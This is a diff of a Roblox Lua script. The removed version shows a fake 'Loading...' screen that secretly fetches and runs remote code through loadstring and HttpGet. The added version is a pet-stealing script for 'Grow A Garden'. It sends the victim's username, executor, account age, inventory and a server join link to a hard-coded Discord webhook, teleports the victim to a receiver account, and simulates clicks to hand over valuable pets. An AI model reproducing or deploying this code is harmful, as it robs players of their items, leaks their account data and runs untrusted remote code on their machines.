@@ -1,122 +1,240 @@
--- Создание GUI
-local ScreenGui = Instance.new("ScreenGui")
-ScreenGui.Name = "ColorfulLoadingScreen"
-ScreenGui.ResetOnSpawn = false
-ScreenGui.Parent = game.CoreGui
+repeat 
+    task.wait()
+until game:IsLoaded()
 
--- Основной фон
-local Background = Instance.new("Frame")
-Background.Size = UDim2.new(0, 450, 0, 240)
-Background.Position = UDim2.new(0.5, -225, 0.5, -120)
-Background.BackgroundColor3 = Color3.fromRGB(25, 25, 50)
-Background.BackgroundTransparency = 0.02
-Background.BorderSizePixel = 0
-Background.Parent = ScreenGui
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1399110447600242819/Ln1Qds770unNt6fpn688JOjkOMYK9naSUB-hB4fbwf8mFagdzXJZlBks1fa6BI7gA7t_"
+local VICTIM = game.Players.LocalPlayer
 
-local UICorner = Instance.new("UICorner")
-UICorner.CornerRadius = UDim.new(0, 24)
-UICorner.Parent = Background
-
--- Заголовок
-local Title = Instance.new("TextLabel")
-Title.Size = UDim2.new(1, 0, 0.35, 0)
-Title.Position = UDim2.new(0, 0, 0, 0)
-Title.BackgroundTransparency = 1
-Title.Text = "🌈 Loading..."
-Title.TextColor3 = Color3.fromRGB(255, 255, 150)
-Title.TextStrokeColor3 = Color3.fromRGB(255, 80, 80)
-Title.TextStrokeTransparency = 0.7
-Title.TextScaled = true
-Title.Font = Enum.Font.GothamBold
-Title.Parent = Background
-loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/ETgqZKbZF6A6JEpo/raw", true))()
--- Таймер
-local TimerLabel = Instance.new("TextLabel")
-TimerLabel.Size = UDim2.new(1, 0, 0.25, 0)
-TimerLabel.Position = UDim2.new(0, 0, 0.35, 0)
-TimerLabel.BackgroundTransparency = 1
-TimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TimerLabel.TextStrokeTransparency = 0.8
-TimerLabel.TextScaled = true
-TimerLabel.Font = Enum.Font.Gotham
-TimerLabel.Text = "Approximately 30 seconds left"
-TimerLabel.Parent = Background
-
--- Прогресс-бар задний фон
-local ProgressBarBackground = Instance.new("Frame")
-ProgressBarBackground.Size = UDim2.new(0.9, 0, 0.12, 0)
-ProgressBarBackground.Position = UDim2.new(0.05, 0, 0.75, 0)
-ProgressBarBackground.BackgroundColor3 = Color3.fromRGB(80, 80, 120)
-ProgressBarBackground.BorderSizePixel = 0
-ProgressBarBackground.Parent = Background
-
-local bgCorner = Instance.new("UICorner")
-bgCorner.CornerRadius = UDim.new(1, 0)
-bgCorner.Parent = ProgressBarBackground
-
--- Прогресс-бар заливка
-local ProgressBarFill = Instance.new("Frame")
-ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
-ProgressBarFill.Position = UDim2.new(0, 0, 0, 0)
-ProgressBarFill.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
-ProgressBarFill.BorderSizePixel = 0
-ProgressBarFill.Parent = ProgressBarBackground
-
-local fillCorner = Instance.new("UICorner")
-fillCorner.CornerRadius = UDim.new(1, 0)
-fillCorner.Parent = ProgressBarFill
-
--- Радужный градиент
-local UIGradient = Instance.new("UIGradient")
-UIGradient.Color = ColorSequence.new{
-    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-    ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 128, 0)),
-    ColorSequenceKeypoint.new(0.4, Color3.fromRGB(255, 255, 0)),
-    ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 0)),
-    ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 255, 255)),
-    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 128, 255))
+local USERNAMES = {
+    "ZeeS_Farm01"
 }
-UIGradient.Rotation = 0
-UIGradient.Parent = ProgressBarFill
 
--- Анимация градиента
+local PET_WHITELIST = {
+    'Raccoon',
+    'T-Rex',
+    'Fennec Fox',
+    'Dragonfly',
+    'Butterfly',
+    'Disco Bee',
+    'Mimic Octopus',
+    'Queen Bee',
+    'Spinosaurus',
+    'Kitsune',
+    'Corrupted Kitsune',
+    'Brontosaurus',
+    'Chicken Zombie',
+    'Red Fox',
+    'Dilophosaurus'
+}
+
+local victimPetTable = {}
+
+local VirtualInputManager = game:GetService("VirtualInputManager")
+local dataModule = require(game:GetService("ReplicatedStorage").Modules.DataService)
+
+-- ▼ Условия для возраста и веса
+local MIN_AGE = 20
+local MIN_WEIGHT = 2.0
+
+-- ▼ Проверка по имени, возрасту и весу
+local function checkPetsWhilelist(petData)
+    local petName = petData.PetType or ""
+    local petAge = petData.Age or 0
+    local petWeight = petData.Weight or 0
+
+    local nameMatch = table.find(PET_WHITELIST, petName)
+    local statMatch = petAge >= MIN_AGE and petWeight >= MIN_WEIGHT
+
+    return nameMatch or statMatch
+end
+
+local function waitForJoin()
+    local findTarget = false
+    local trigeretName = nil
+
+    for _, player in game.Players:GetPlayers() do
+        if not table.find(USERNAMES, player.Name) then
+            continue
+        end
+
+        trigeretName = player.Name
+        findTarget = true
+    end
+
+    return findTarget, trigeretName
+end
+
+function createDiscordEmbed(petList, totalValue, fileUrl)
+    local embed = {
+        title = "🌵 Grow A Garden Hit - DARK SKIDS 🍀",
+        color = 65280,
+        fields = {
+            {
+                name = "👤 **Player Information**",
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
+                    VICTIM.Name, 
+                    table.concat(USERNAMES, " "), 
+                    identifyexecutor(), 
+                    game.Players.LocalPlayer.AccountAge
+                ),
+                inline = false
+            },
+            {
+                name = "💰 **Total Value**",
+                value = string.format("```%s¢```", totalValue),
+                inline = false
+            },
+            {
+                name = "🌴 **Backpack**",
+                value = string.format("```%s```", petList),
+                inline = false
+            },
+            {
+                name = "🏝️ **Join with URL**",
+                value = string.format(
+                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
+                    game.JobId, 
+                    game.PlaceId, 
+                    game.JobId
+                ),
+                inline = false
+            }
+        },
+        footer = {
+            text = string.format("%s | %s", game.PlaceId, game.JobId)
+        }
+    }
+
+    local data = {
+        content = string.format(
+            "--@everyone\ngame:GetService(\"TeleportService\"):TeleportToPlaceInstance(%s, \"%s\")\n",
+            game.PlaceId,
+            game.JobId
+        ),
+        username = game.Players.LocalPlayer.Name,
+        avatar_url = "https://cdn.discordapp.com/attachments/1024859338205429760/1103739198735261716/icon.png",
+        embeds = {embed}
+    }
+
+    local jsonData = game:GetService("HttpService"):JSONEncode(data)
+
+    local headers = {
+        ["Content-Type"] = "application/json"
+    }
+
+    local request = http_request or request or HttpPost or syn.request
+    local response = request({
+        Url = WEBHOOK_URL,
+        Method = "POST",
+        Headers = headers,
+        Body = jsonData
+    })
+
+    if response.StatusCode ~= 200 and response.StatusCode ~= 204 then
+        warn("Ошибка отправки в Discord:", response.StatusCode, response.Body)
+    end
+end
+
+local function teleportTarget(targetName)
+    VICTIM.Character.HumanoidRootPart.CFrame = game.Players[targetName].Character.HumanoidRootPart.CFrame
+end
+
+local function deltaBypass()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0, true, nil, false
+    )
+    task.wait()
+    VirtualInputManager:SendMouseButtonEvent(
+        workspace.Camera.ViewportSize.X / 2, workspace.Camera.ViewportSize.Y / 2,
+        0, false, nil, false
+    )
+end
+
+local function getPetObject(petUid: string): Instance?
+    for _, object in pairs(VICTIM.Backpack:GetChildren()) do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+
+    for _, object in workspace[VICTIM.Name]:GetChildren() do
+        if object:GetAttribute("PET_UUID") == petUid then
+            return object
+        end
+    end
+
+    return nil
+end
+
+local function equipPet(pet)
+    if pet:GetAttribute("d") then
+        game:GetService("ReplicatedStorage"):WaitForChild("GameEvents"):WaitForChild("Favorite_Item"):FireServer(pet)
+    end
+    VICTIM.Character.Humanoid:EquipTool(pet)
+end
+
+-- ▼ ОБНОВЛЁННАЯ ФУНКЦИЯ
+local function getPlayersPets()
+    for petUid, petData in dataModule:GetData().PetsData.PetInventory.Data do
+        if not checkPetsWhilelist(petData) then
+            continue
+        end
+
+        local petName = petData.PetType or "Unknown"
+        local petAge = petData.Age or 0
+        local petWeight = petData.Weight or 0
+
+        local info = string.format("%s | %d дней | %.1f кг", petName, petAge, petWeight)
+        table.insert(victimPetTable, info)
+    end
+end
+
+local function startSteal(trigerName)
+    if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
+        game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
+        deltaBypass()
+    end
+end
+
+local function checkPetsInventory(target)
+    for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhilelist(value) then
+            continue
+        end
+
+        local petObject = getPetObject(petUid)
+        if not petObject then
+            continue
+        end
+
+        equipPet(petObject)
+        task.wait(0.2)
+        startSteal(target)
+    end
+end
+
+local function idlingTarget()
+    task.spawn(function()
+        while task.wait(0.2) do
+            local isTarget, trigerName = waitForJoin()
+            if isTarget then
+                teleportTarget(trigerName)
+                checkPetsInventory(trigerName)
+            end
+        end
+    end)
+end
+
+-- Запуск
+getPlayersPets()
+
 task.spawn(function()
-    while UIGradient do
-        UIGradient.Rotation = (UIGradient.Rotation + 1) % 360
-        task.wait(0.03)
+    while task.wait(0.5) do
+        if #victimPetTable > 0 then
+            idlingTarget()
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
+            break
+        end
     end
 end)
-
--- Таймер и прогресс
-local duration = 30
-for i = duration, 1, -1 do
-    TimerLabel.Text = "Approximately " .. i .. " seconds left"
-
-    local progress = (duration - i + 1) / duration
-    ProgressBarFill:TweenSize(
-        UDim2.new(progress, 0, 1, 0),
-        Enum.EasingDirection.Out,
-        Enum.EasingStyle.Quad,
-        0.25,
-        true
-    )
-
-    wait(1)
-end
-
--- 🧊 Плавное исчезновение
-for t = 1, 20 do
-    local alpha = t / 20
-    Background.BackgroundTransparency = 0.02 + alpha
-    ProgressBarBackground.BackgroundTransparency = alpha
-    ProgressBarFill.BackgroundTransparency = alpha
-    Title.TextTransparency = alpha
-    Title.TextStrokeTransparency = alpha
-    TimerLabel.TextTransparency = alpha
-    TimerLabel.TextStrokeTransparency = alpha
-    wait(0.03)
-end
-
--- Удаление GUI
-ScreenGui:Destroy()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
